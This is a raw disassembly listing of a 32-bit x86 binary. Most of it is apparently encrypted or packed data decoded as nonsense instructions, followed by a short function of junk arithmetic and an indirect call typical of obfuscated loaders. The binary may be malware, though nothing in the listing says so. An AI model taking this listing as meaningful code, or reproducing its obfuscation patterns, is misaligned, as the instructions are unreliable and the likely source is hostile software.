  40fb40:	mov    edx,0x5df10b09
  40fb45:	mov    DWORD PTR [edi+esi*4],ebp
  40fb48:	mov    dl,0xc4
  40fb4a:	stos   BYTE PTR es:[edi],al
  40fb4b:	adc    al,0xe1
  40fb4d:	jnp    0x40fb53
  40fb4f:	aaa    
  40fb50:	sub    eax,0xe85ef096
  40fb55:	sbb    BYTE PTR [edx-0x539dea05],bh
  40fb5b:	push   ds
  40fb5c:	(bad)  
  40fb5d:	jns    0x40fb40
  40fb5f:	ss inc ecx
  40fb61:	mov    ?,WORD PTR [edx+0x27]
  40fb64:	(bad)  [edx+0x774443d3]
  40fb6a:	adc    eax,0x6a6966b0
  40fb6f:	out    0x24,eax
  40fb71:	xchg   DWORD PTR [ebx+0x5554a49e],edx
  40fb77:	add    DWORD PTR [edi],eax
  40fb79:	mov    esp,0x6e425236
  40fb7e:	push   es
  40fb7f:	stos   BYTE PTR es:[edi],al
  40fb80:	inc    ebp
  40fb81:	sbb    DWORD PTR [ecx+ecx*4],0x61
  40fb85:	pop    ebp
  40fb86:	imul   ebp,DWORD PTR [esi+0x3b],0x9e4e618a
  40fb8d:	jne    0x40fbd9
  40fb8f:	xor    BYTE PTR [edx-0x4d],bl
  40fb92:	dec    ebx
  40fb93:	cdq    
  40fb94:	inc    edx
  40fb95:	dec    ebx
  40fb96:	push   es
  40fb97:	sbb    BYTE PTR [ecx],bl
  40fb99:	push   edx
  40fb9a:	das    
  40fb9b:	je     0x40fba6
  40fb9d:	(bad)  
  40fb9e:	fcmovbe st,st(3)
  40fba0:	in     al,0xcb
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffdd
  40fbc9:	aam    0xec
  40fbcb:	arpl   ax,dx
  40fbcd:	mov    dh,0x7e
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fb71
  40fbd5:	fmul   st(3),st
  40fbd7:	xchg   edx,eax
  40fbd8:	and    bl,BYTE PTR [edx]
  40fbda:	xor    BYTE PTR [ebx],al
  40fbdc:	sub    al,BYTE PTR [edx-0x4d]
  40fbdf:	xchg   ebp,eax
  40fbe0:	mov    ds:0x57f2bfc5,al
  40fbe5:	lods   eax,DWORD PTR ds:[esi]
  40fbe6:	push   cs
  40fbe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbe8:	dec    esp
  40fbe9:	sbb    DWORD PTR [eax+0x55],0xe6f3844d
  40fbf0:	aaa    
  40fbf1:	(bad)  
  40fbf2:	push   cs
  40fbf3:	ror    BYTE PTR [ebp-0x49195c63],cl
  40fbf9:	lods   al,BYTE PTR ds:[esi]
  40fbfa:	das    
  40fbfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbfc:	call   0x9254:0xe95d5bee
  40fc03:	or     DWORD PTR [ecx-0x30681413],0x8f18e3f4
  40fc0d:	mov    ah,0xc7
  40fc0f:	arpl   WORD PTR [edx-0x48e09bde],dx
  40fc15:	sahf   
  40fc16:	out    dx,al
  40fc17:	mov    edx,0x61e18c78
  40fc1c:	xchg   esp,eax
  40fc1d:	mov    dh,0x69
  40fc1f:	and    BYTE PTR [ecx+0x12],dl
  40fc22:	iret   
  40fc23:	fucom  st(3)
  40fc25:	pop    ds
  40fc26:	xor    DWORD PTR [esi+0x1d],ecx
  40fc29:	pop    ebp
  40fc2a:	(bad)  
  40fc2b:	push   cs
  40fc2c:	pop    ss
  40fc2d:	les    eax,FWORD PTR [ebx-0x285215ce]
  40fc33:	or     al,0x7e
  40fc35:	(bad)  
  40fc37:	jl     0x40fc59
  40fc39:	push   ecx
  40fc3a:	and    al,0x28
  40fc3c:	call   0x4e7e:0x4465e3f3
  40fc43:	scas   eax,DWORD PTR es:[edi]
  40fc44:	mov    bl,0x78
  40fc46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc47:	add    edi,DWORD PTR [ebx+0x37]
  40fc4a:	mov    ds:0xe8de2b80,eax
  40fc4f:	xchg   BYTE PTR [esp+esi*8],dl
  40fc52:	ins    DWORD PTR es:[edi],dx
  40fc53:	or     al,0xc4
  40fc55:	mov    dh,0x26
  40fc57:	and    DWORD PTR [esi],esp
  40fc59:	cmp    ch,cl
  40fc5b:	ror    BYTE PTR [ecx-0x1102174d],1
  40fc61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc62:	cld    
  40fc63:	fnstenv [edx-0x38a2419c]
  40fc69:	rcl    DWORD PTR [eax],cl
  40fc6b:	arpl   WORD PTR [esi+0x6f],dx
  40fc6e:	jge    0x40fc1f
  40fc70:	neg    BYTE PTR [ebx]
  40fc72:	pop    ss
  40fc73:	rol    bl,cl
  40fc75:	cmp    dl,BYTE PTR [eax]
  40fc77:	and    DWORD PTR [ebx],esi
  40fc79:	jnp    0x40fca5
  40fc7b:	push   ecx
  40fc7c:	adc    al,0xc3
  40fc7e:	out    dx,eax
  40fc7f:	(bad)  
  40fc80:	and    eax,DWORD PTR [ebx+0x605f45c2]
  40fc86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc87:	lds    ebx,FWORD PTR [eax+0x5b971ccd]
  40fc8d:	loope  0x40fca7
  40fc8f:	inc    ecx
  40fc90:	push   ss
  40fc91:	push   0x47
  40fc93:	(bad)  
  40fc94:	mov    ebx,0x2eec6c9d
  40fc99:	add    al,0x90
  40fc9b:	punpcklbw mm2,DWORD PTR [esi-0x7ab8dd86]
  40fca2:	addr16 adc al,0xc0
  40fca5:	jno    0x40fd21
  40fca7:	out    0xf6,al
  40fca9:	inc    ebp
  40fcaa:	call   DWORD PTR [edi-0x88c35b7]
  40fcb0:	arpl   WORD PTR [eax],bp
  40fcb2:	stos   BYTE PTR es:[edi],al
  40fcb3:	sbb    eax,0xbc769226
  40fcb8:	inc    esi
  40fcb9:	xchg   edx,eax
  40fcba:	inc    ebp
  40fcbb:	or     eax,0x4b7d70be
  40fcc0:	inc    esp
  40fcc1:	add    al,0xf7
  40fcc3:	cwde   
  40fcc4:	cdq    
  40fcc5:	out    0xe3,eax
  40fcc7:	xchg   dh,bl
  40fcc9:	loop   0x40fc61
  40fccb:	enter  0x1d8e,0x8e
  40fccf:	bound  esp,QWORD PTR [edi+0x49]
  40fcd2:	xor    BYTE PTR [ebp+0x78302167],cl
  40fcd8:	outs   dx,BYTE PTR ds:[esi]
  40fcd9:	jno    0x40fd26
  40fcdb:	push   ebp
  40fcdc:	clc    
  40fcdd:	(bad)  
  40fcde:	push   edi
  40fcdf:	pop    ss
  40fce0:	leave  
  40fce1:	nop
  40fce2:	inc    ebp
  40fce3:	(bad)  
  40fce4:	enter  0x1739,0xdb
  40fce8:	daa    
  40fce9:	aaa    
  40fcea:	pop    esp
  40fceb:	mov    cl,0xa1
  40fced:	pop    eax
  40fcee:	retf   0x5982
  40fcf1:	dec    edi
  40fcf2:	push   eax
  40fcf3:	cmp    eax,0x632c1d71
  40fcf8:	jo     0x40fd1d
  40fcfa:	xor    BYTE PTR [eax-0x2e],bl
  40fcfd:	mov    eax,ds:0xf320f49a
  40fd02:	sbb    bl,bh
  40fd04:	jg     0x40fd66
  40fd06:	xchg   BYTE PTR [esi-0x2b],dh
  40fd09:	ds retf 0xaafb
  40fd0d:	mov    bh,0x91
  40fd0f:	adc    DWORD PTR [eax],ebp
  40fd11:	call   0x3b84:0x5bdbb274
  40fd18:	imul   ecx,DWORD PTR [eax],0x1a
  40fd1b:	jns    0x40fd7a
  40fd1d:	lods   eax,DWORD PTR ds:[esi]
  40fd1e:	sub    eax,0xea59e551
  40fd23:	dec    edx
  40fd24:	lods   eax,DWORD PTR ds:[esi]
  40fd25:	lods   al,BYTE PTR ds:[esi]
  40fd26:	les    ebx,FWORD PTR [esi]
  40fd28:	jns    0x40fd50
  40fd2a:	jmp    0x40fd16
  40fd2c:	cmp    DWORD PTR [edx+0x10],ebx
  40fd2f:	jns    0x40fda7
  40fd31:	cmp    eax,DWORD PTR [edx+0x19]
  40fd34:	pop    ds
  40fd35:	test   BYTE PTR [eax],ah
  40fd37:	icebp  
  40fd38:	int    0x67
  40fd3a:	dec    ecx
  40fd3b:	add    BYTE PTR [esi+0x21],bl
  40fd3e:	lods   al,BYTE PTR ds:[esi]
  40fd3f:	cwde   
  40fd40:	in     eax,0xd8
  40fd42:	aas    
  40fd43:	and    BYTE PTR ds:0x7d2839d2,ch
  40fd49:	sub    al,0xa7
  40fd4b:	test   al,0x47
  40fd4d:	push   ss
  40fd4e:	dec    edx
  40fd4f:	or     dh,0x64
  40fd52:	ja     0x40fcfe
  40fd54:	icebp  
  40fd55:	mov    edi,0x187aff1f
  40fd5a:	push   ds
  40fd5b:	lahf   
  40fd5c:	fcomip st,st(6)
  40fd5e:	mov    cl,0xe8
  40fd60:	or     BYTE PTR [ebx+0x1f8a15b0],dl
  40fd66:	push   ds
  40fd67:	mov    bl,0x41
  40fd69:	push   ds
  40fd6a:	stos   DWORD PTR es:[edi],eax
  40fd6b:	out    0x79,eax
  40fd6d:	xor    edx,DWORD PTR [edx+0x4e84fb50]
  40fd73:	cmp    eax,0x6714585b
  40fd78:	sbb    ebx,DWORD PTR [ebx-0x252e99ae]
  40fd7e:	das    
  40fd7f:	xor    cl,BYTE PTR [ebp-0x7c928af1]
  40fd85:	sbb    edx,edx
  40fd87:	xchg   edx,eax
  40fd88:	call   0xec36:0xe2ee8827
  40fd8f:	sbb    ebp,esi
  40fd91:	les    esp,FWORD PTR [edx+0x68b68e56]
  40fd97:	loop   0x40fd8d
  40fd99:	fsubp  st(4),st
  40fd9b:	loop   0x40fdc8
  40fd9d:	(bad)  [edx]
  40fd9f:	mov    ds:0x7e8dd7fd,eax
  40fda4:	in     al,dx
  40fda5:	cmp    BYTE PTR [esi],bh
  40fda7:	arpl   si,si
  40fda9:	outs   dx,BYTE PTR ds:[esi]
  40fdaa:	nop
  40fdab:	inc    edx
  40fdac:	ret    
  40fdad:	or     BYTE PTR [ebx-0x77],0x60
  40fdb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb2:	ss rcl ch,0x4a
  40fdb6:	pop    edi
  40fdb7:	xchg   ebp,eax
  40fdb8:	ins    BYTE PTR es:[edi],dx
  40fdb9:	mov    BYTE PTR [ebx-0x686376b9],dh
  40fdbf:	jg     0x40fdda
  40fdc1:	pop    ss
  40fdc2:	mov    al,0x6f
  40fdc4:	jmp    0x3303283
  40fdc9:	inc    ebx
  40fdca:	adc    al,0x98
  40fdcc:	stos   DWORD PTR es:[edi],eax
  40fdcd:	add    DWORD PTR [eax],edi
  40fdcf:	imul   edx,DWORD PTR [ebx+0x7d],0x9c610388
  40fdd6:	inc    eax
  40fdd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdd8:	jp     0x40fdb3
  40fdda:	in     eax,dx
  40fddb:	inc    ebx
  40fddc:	int3   
  40fddd:	in     al,0x69
  40fddf:	aaa    
  40fde0:	clc    
  40fde1:	fiadd  DWORD PTR [ebp+0x13]
  40fde4:	sub    eax,0xaf60fe33
  40fde9:	inc    esi
  40fdea:	lock sbb ah,BYTE PTR [edx-0x36c89b50]
  40fdf1:	lea    esp,[esi-0x3ec57331]
  40fdf7:	in     al,dx
  40fdf8:	xor    al,0xa8
  40fdfa:	and    ebp,DWORD PTR [ecx+0x47]
  40fdfd:	adc    ebp,esp
  40fdff:	dec    ebx
  40fe00:	jg     0x40fe58
  40fe02:	fld    DWORD PTR [ebx-0x36]
  40fe05:	mov    WORD PTR [ebx+eiz*2+0x2693ae98],cs
  40fe0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe0d:	rcl    DWORD PTR [edi],0xa9
  40fe10:	xor    BYTE PTR [edx-0x993585a],cl
  40fe16:	cld    
  40fe17:	(bad)  
  40fe18:	icebp  
  40fe19:	mov    al,0xe7
  40fe1b:	call   0x4abc0470
  40fe20:	gs jb  0x40fde6
  40fe23:	jecxz  0x40fe8e
  40fe25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe26:	mov    edi,0x674954b5
  40fe2b:	das    
  40fe2c:	add    DWORD PTR [esi+eax*1+0x4f],edi
  40fe30:	leave  
  40fe31:	dec    ebx
  40fe32:	xchg   BYTE PTR [esi],ch
  40fe34:	in     eax,dx
  40fe35:	cli    
  40fe36:	adc    cl,dh
  40fe38:	and    eax,0xe825e9dc
  40fe3d:	imul   edx,DWORD PTR [esi],0x70e93803
  40fe43:	imul   ebp,DWORD PTR [eax-0x4370aa57],0x2d33ff5b
  40fe4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe4e:	dec    ebp
  40fe4f:	pushfw 
  40fe51:	mov    ebp,0x6166c8a8
  40fe56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe57:	xor    al,0x1e
  40fe59:	inc    edx
  40fe5a:	or     al,0x99
  40fe5c:	imul   ebp,DWORD PTR [ecx],0xffffffe8
  40fe5f:	dec    esi
  40fe60:	fldcw  WORD PTR [esi-0x1c]
  40fe63:	push   edi
  40fe64:	cmp    DWORD PTR [eax+0x75],0xc10bfeb8
  40fe6b:	xor    eax,0x2b682eb4
  40fe70:	dec    ecx
  40fe71:	dec    eax
  40fe72:	outs   dx,DWORD PTR ds:[esi]
  40fe73:	lods   eax,DWORD PTR ds:[esi]
  40fe74:	add    al,0xe0
  40fe76:	xor    eax,DWORD PTR [esi-0x185ca65c]
  40fe7c:	fnsave [edx]
  40fe7e:	adc    ch,dh
  40fe80:	inc    esi
  40fe81:	stos   DWORD PTR es:[edi],eax
  40fe82:	mov    eax,ds
  40fe84:	mov    dl,0xca
  40fe86:	imul   esp,DWORD PTR [edi],0xb0720f58
  40fe8c:	imul   esi,DWORD PTR [esi-0x66cf1d9e],0x47
  40fe93:	sub    BYTE PTR [eax+edi*1+0x7dea0e54],al
  40fe9a:	outs   dx,BYTE PTR ds:[esi]
  40fe9b:	inc    ecx
  40fe9c:	inc    ecx
  40fe9d:	cwde   
  40fe9e:	int3   
  40fe9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fea0:	sar    DWORD PTR [edx+ebp*2],1
  40fea3:	repnz stos DWORD PTR es:[edi],eax
  40fea5:	mov    bl,0xde
  40fea7:	loope  0x40fe5c
  40fea9:	inc    DWORD PTR ds:0xa6b931cd
  40feaf:	jbe    0x40ff0c
  40feb1:	ror    DWORD PTR [ecx-0xc],cl
  40feb4:	and    ch,bh
  40feb6:	jno    0x40ff27
  40feb8:	push   ecx
  40feb9:	mov    eax,ds:0xbbed2ea3
  40febe:	in     eax,dx
  40febf:	fisttp QWORD PTR [edi-0x7d821c68]
  40fec5:	add    al,0x95
  40fec7:	into   
  40fec8:	inc    edx
  40fec9:	cli    
  40feca:	jae    0x40fecb
  40fecc:	(bad)  
  40fecd:	ror    DWORD PTR [edx],1
  40fecf:	lock sar BYTE PTR [eax-0x624462b0],0x8b
  40fed7:	inc    ebp
  40fed8:	or     al,0x33
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x1f794346
  40fef3:	xor    ecx,ebp
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	mov    ecx,0xc20e5f83
  40ff02:	shr    ecx,cl
  40ff04:	fwait
  40ff05:	arpl   WORD PTR [ebx-0x2b],bp
  40ff08:	mov    ds:0x1adeaf9d,al
  40ff0d:	pop    ecx
  40ff0e:	or     ah,BYTE PTR [esi*1+0x37124106]
  40ff15:	in     eax,0xb6
  40ff17:	repz and DWORD PTR [esi+0x48b3fa66],esi
  40ff1e:	lods   eax,DWORD PTR ds:[esi]
  40ff1f:	or     edx,DWORD PTR [edi+0x64]
  40ff22:	push   ebp
  40ff23:	ficomp WORD PTR [ecx+0x77f1e0c4]
  40ff29:	cmp    ebp,0x8ea5f57c
  40ff2f:	lock jmp 0x57a46382
  40ff35:	sub    ebx,ebx
  40ff37:	inc    esi
  40ff38:	mov    ss,WORD PTR [edi]
  40ff3a:	xchg   ebx,eax
  40ff3b:	cdq    
  40ff3c:	loop   0x40ff6d
  40ff3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff3f:	int    0x5e
  40ff41:	popa   
  40ff42:	pushf  
  40ff43:	ins    BYTE PTR es:[edi],dx
  40ff44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff45:	pop    ecx
  40ff46:	icebp  
  40ff47:	or     BYTE PTR [edi],ch
  40ff49:	std    
  40ff4a:	mov    al,ds:0x842baf87
  40ff4f:	push   edi
  40ff50:	out    0x99,eax
  40ff52:	loope  0x40fed9
  40ff54:	inc    ecx
  40ff55:	loop   0x40ffa0
  40ff57:	xlat   BYTE PTR ds:[ebx]
  40ff58:	jmp    0x40ff42
  40ff5a:	xchg   edx,eax
  40ff5b:	pop    es
  40ff5c:	dec    eax
  40ff5d:	xor    BYTE PTR [eax+0xb],dh
  40ff60:	iret   
  40ff61:	test   al,0x7d
  40ff63:	mov    bl,0xff
  40ff65:	icebp  
  40ff66:	mov    gs,WORD PTR [esi]
  40ff68:	mov    ds:0x4d86bdef,al
  40ff6d:	xchg   ecx,eax
  40ff6e:	js     0x40ff80
  40ff70:	sub    eax,0x9aa745c4
  40ff75:	arpl   WORD PTR [edx],dx
  40ff77:	adc    edx,esi
  40ff79:	cdq    
  40ff7a:	cdq    
  40ff7b:	es scas eax,DWORD PTR es:[edi]
  40ff7d:	daa    
  40ff7e:	mov    al,0x7
  40ff80:	and    BYTE PTR [esi-0x67357943],bh
  40ff86:	lock cli 
  40ff88:	es fwait
  40ff8a:	xor    al,BYTE PTR [esi+0x3f]
  40ff8d:	bound  ecx,QWORD PTR [ebx+0x6b]
  40ff90:	shl    DWORD PTR ds:0x546ccebf,0x79
  40ff97:	xor    BYTE PTR [esi+ebx*4+0xb],dl
  40ff9b:	pop    ss
  40ff9c:	jmp    0x40ffe6
  40ff9e:	xor    ecx,esp
  40ffa0:	mov    al,0x6
  40ffa2:	jbe    0x40ff8f
  40ffa4:	in     eax,0xe0
  40ffa6:	(bad)  
  40ffa7:	aam    0x6c
  40ffa9:	xchg   ecx,eax
  40ffaa:	sub    edx,DWORD PTR [eax+eax*1+0x68cd7780]
  40ffb1:	adc    DWORD PTR [edx+0x6b80c480],ebp
  40ffb7:	jge    0x40ffc5
  40ffb9:	addr16 push edx
  40ffbb:	sub    eax,0x778217be
  40ffc0:	jae    0x40ff42
  40ffc2:	cmp    al,0x17
  40ffc4:	iret   
  40ffc5:	repz inc eax
  40ffc7:	sti    
  40ffc8:	sbb    dl,al
  40ffca:	adc    eax,0xe8ada38a
  40ffcf:	lahf   
  40ffd0:	imul   ecx,eax,0xdf43952f
  40ffd6:	or     eax,0x68effbe3
  40ffdb:	add    al,0xf1
  40ffdd:	dec    esi
  40ffde:	stos   BYTE PTR es:[edi],al
  40ffdf:	cdq    
  40ffe0:	and    bl,BYTE PTR [esi]
  40ffe2:	cwde   
  40ffe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe4:	push   ebx
  40ffe5:	fs pop ss
  40ffe7:	cmp    esp,edi
  40ffe9:	push   edx
  40ffea:	mov    ebx,0xa1f85ac7
  40ffef:	cld    
  40fff0:	out    0x54,al
  40fff2:	(bad)  
  40fff4:	lea    edi,[eax+0x7f]
  40fff7:	daa    
  40fff8:	test   al,0xd4
  40fffa:	retf   
  40fffb:	xor    al,0x0
  40fffd:	test   BYTE PTR [ebx+edi*4],0x22
  410001:	rcl    dl,cl
  410003:	jnp    0x40ffcf
  410005:	scas   eax,DWORD PTR es:[edi]
  410006:	aad    0xc2
  410008:	popa   
  410009:	xchg   ecx,eax
  41000a:	jge    0x410082
  41000c:	mov    ds:0xf6aa8b4e,al
  410011:	mov    edi,0x673ccb09
  410016:	mov    esi,0x9d13bb59
  41001b:	ficomp DWORD PTR [ecx]
  41001d:	gs gs (bad) 
  410020:	neg    BYTE PTR [edi]
  410022:	adc    ebx,edx
  410024:	mov    bl,0x2d
  410026:	jmp    0x4100a0
  410028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410029:	retf   
  41002a:	mov    cl,0x33
  41002c:	les    edx,FWORD PTR [edx+0x16]
  41002f:	inc    eax
  410030:	mov    esp,DWORD PTR [esp+esi*1]
  410033:	xlat   BYTE PTR ds:[ebx]
  410034:	ds jle 0x4100ae
  410037:	stos   DWORD PTR es:[edi],eax
  410038:	push   0xffffff96
  41003a:	out    0x4a,eax
  41003c:	hlt    
  41003d:	idiv   dh
  41003f:	cld    
  410040:	xchg   DWORD PTR [edx-0x4e],esp
  410043:	jbe    0x40ffe6
  410045:	or     DWORD PTR ss:[ebx+0x7],ecx
  410049:	and    DWORD PTR [ebx],esp
  41004b:	sbb    dl,dl
  41004d:	ins    BYTE PTR es:[edi],dx
  41004e:	(bad)
  410051:	sar    BYTE PTR [esi+0x593dd5a4],0xf5
  410058:	popf   
  410059:	adc    al,0xef
  41005b:	and    edx,DWORD PTR [esi-0x6f621540]
  410061:	inc    ebx
  410062:	add    bh,BYTE PTR [esi-0x75cce6ba]
  410068:	lock or BYTE PTR [ebx-0x2],cl
  41006c:	adc    BYTE PTR cs:[edx-0x6d252349],cl
  410073:	retf   
  410074:	div    DWORD PTR [edx]
  410076:	mov    bl,0x58
  410078:	xlat   BYTE PTR ds:[ebx]
  410079:	xor    dh,BYTE PTR [ebp-0x19]
  41007c:	fwait
  41007d:	xor    esi,DWORD PTR [esi]
  41007f:	daa    
  410080:	imul   ecx,DWORD PTR ds:0x56ab0003,0xbe7a6a2
  41008a:	repz sub esp,DWORD PTR [ecx]
  41008d:	mov    ds:0xa7a2a405,al
  410092:	retf   0x5a83
  410095:	inc    esi
  410096:	fiadd  DWORD PTR [ebx-0x6b1d4876]
  41009c:	sbb    DWORD PTR ds:0x8a83420,0xb585fbc8
  4100a6:	sti    
  4100a7:	cmp    bl,BYTE PTR [ecx-0x8acdf00]
  4100ad:	dec    ebx
  4100ae:	cmp    al,0x4f
  4100b0:	fwait
  4100b1:	mov    ch,0x5a
  4100b3:	ss inc edx
  4100b5:	call   0xea0596d0
  4100ba:	lods   al,BYTE PTR ds:[esi]
  4100bb:	mov    ebp,0xabe436b1
  4100c0:	out    0x5e,eax
  4100c2:	test   eax,0x45f81687
  4100c7:	jmp    FWORD PTR [ebx]
  4100c9:	in     al,0xe2
  4100cb:	and    eax,0x3a8aac81
  4100d0:	inc    edi
  4100d1:	aas    
  4100d2:	add    ecx,esi
  4100d4:	popf   
  4100d5:	in     al,dx
  4100d6:	cmp    eax,0x4f7f7ff6
  4100db:	xor    ebp,DWORD PTR ds:0x47f4cd82
  4100e1:	mov    ds,ebx
  4100e3:	cmp    BYTE PTR [ebp+0x39],bh
  4100e6:	in     eax,0x43
  4100e8:	jecxz  0x4100e2
  4100ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100eb:	xor    BYTE PTR [eax],al
  4100ed:	fsub   st,st(2)
  4100ef:	add    BYTE PTR [eax],bh
  4100f1:	cwde   
  4100f2:	bound  esi,QWORD PTR [ebx+0x25]
  4100f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100f6:	sub    ebp,DWORD PTR [esi-0x56470441]
  4100fc:	xchg   edx,eax
  4100fd:	nop
  4100fe:	ja     0x410170
  410100:	mov    esp,0x4721e6a
  410105:	xor    ebx,DWORD PTR [ecx+0x1e]
  410108:	dec    esp
  410109:	inc    ebp
  41010a:	fcom   QWORD PTR ds:0x837cac9f
  410110:	jne    0x410110
  410112:	imul   edx,DWORD PTR [edi+0x34],0x95fdf224
  410119:	xor    ebx,DWORD PTR [eax+ebp*4-0x19]
  41011d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41011e:	les    ecx,FWORD PTR [eax]
  410120:	fdiv   DWORD PTR [ebx+0x28]
  410123:	push   edi
  410124:	shl    DWORD PTR [ebx+0x79d15a4b],0x5c
  41012b:	mov    edx,0x784c9cb2
  410130:	test   al,0xd6
  410132:	imul   esp,DWORD PTR [eax-0x7adac66],0x4
  410139:	sub    edx,ebx
  41013b:	scas   eax,DWORD PTR es:[edi]
  41013c:	ror    DWORD PTR [edi+0x18],0x46
  410140:	jge    0x4100d5
  410142:	test   al,0x21
  410144:	fwait
  410145:	ror    DWORD PTR ss:[edi-0x6e],0x2e
  41014a:	in     al,dx
  41014b:	jbe    0x4100ef
  41014d:	daa    
  41014e:	cs in  al,dx
  410150:	mov    esp,ss
  410152:	and    ch,bl
  410154:	cmp    ecx,DWORD PTR [edx+esi*4+0x9aa2f90]
  41015b:	mov    ds,WORD PTR [eax-0x1c]
  41015e:	out    dx,al
  41015f:	mov    eax,0x2c35bfe6
  410164:	dec    ebp
  410165:	push   cs
  410166:	and    eax,0x6cfe5035
  41016b:	push   cs
  41016c:	mov    al,0x9e
  41016e:	leave  
  41016f:	mov    esp,0x8b5f2369
  410174:	xor    ebx,DWORD PTR [edx+0x1b8e079e]
  41017a:	cmp    cl,ah
  41017c:	mov    WORD PTR [eax],?
  41017e:	ret    0x56db
  410181:	arpl   ax,di
  410183:	test   DWORD PTR [edx+ebx*8-0x28],esp
  410187:	int    0x78
  410189:	in     al,0x10
  41018b:	sub    al,0x8e
  41018d:	adc    bl,dl
  41018f:	fidivr WORD PTR [esp+esi*2-0x1d130f8c]
  410196:	or     eax,0xe0dd657a
  41019b:	mov    esi,0xafad906a
  4101a0:	sub    ebx,ebp
  4101a2:	push   eax
  4101a3:	popa   
  4101a4:	call   0xb0debf88
  4101a9:	lods   al,BYTE PTR ds:[esi]
  4101aa:	mov    bh,0xf4
  4101ac:	mov    ebx,0xc75d5fd7
  4101b1:	jb     0x4101e1
  4101b3:	mov    BYTE PTR [esp+eax*8+0x34],ch
  4101b7:	sub    al,0x10
  4101b9:	push   edi
  4101ba:	inc    edi
  4101bb:	push   ebx
  4101bc:	pop    ecx
  4101bd:	mov    esi,0x7735f505
  4101c2:	push   ecx
  4101c3:	mov    dh,0xac
  4101c5:	add    eax,0xb0ebb33d
  4101ca:	call   0xe2f80e40
  4101cf:	cli    
  4101d0:	mov    ah,0x41
  4101d2:	dec    ecx
  4101d3:	inc    esp
  4101d4:	jne    0x410244
  4101d6:	mov    eax,ds:0xefe91dbe
  4101db:	xor    al,0x31
  4101dd:	ss xor ebx,DWORD PTR ds:[edx+0xb]
  4101e2:	cdq    
  4101e3:	lods   al,BYTE PTR ds:[esi]
  4101e4:	dec    ebp
  4101e5:	cmp    ah,BYTE PTR [ebx]
  4101e7:	or     al,BYTE PTR [ecx]
  4101e9:	xor    BYTE PTR [edx-0xa7f9c24],dh
  4101ef:	les    edi,FWORD PTR [ebp-0x20]
  4101f2:	lock lahf 
  4101f4:	pop    esp
  4101f5:	sbb    eax,0x794d5b13
  4101fa:	repnz inc edi
  4101fc:	fisub  WORD PTR [esi+esi*2-0x9]
  410200:	icebp  
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43371f
  41021e:	adc    DWORD PTR ds:0x433757,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43368b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4337ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43375f
  41026b:	or     DWORD PTR ds:0x433757,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43372b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43372b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43372b,ecx
  410291:	cmp    DWORD PTR ds:0x43372b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43372b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43372b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43372b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43372b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433683
